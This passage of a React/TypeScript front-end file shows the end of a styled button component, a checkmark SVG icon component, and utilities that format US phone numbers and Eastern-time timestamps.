        className="w-full max-w-xl mx-auto block bg-magenta text-white font-bold rounded-full py-4 shadow-md"
      >
        {children}
      </button>
    </div>
  );
}

function CheckIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="20 6 9 17 4 12" />
    </svg>
  );
}

// ---------------- Utils ----------------

function formatPhone(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 10);
  if (d.length < 4) return d;
  if (d.length < 7) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
  return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
}

function formatESTTimestamp(d: Date) {
  const parts = new Intl.DateTimeFormat("en-US", {
    timeZone: "America/New_York",
    month: "2-digit",
    day: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    hour12: true,
  }).formatToParts(d);
  const get = (t: string) => parts.find((p) => p.type === t)?.value ?? "";
  return `${get("month")}/${get("day")}/${get("year")} ${get("hour")}:${get("minute")} ${get("dayPeriod").toUpperCase()}`;
}
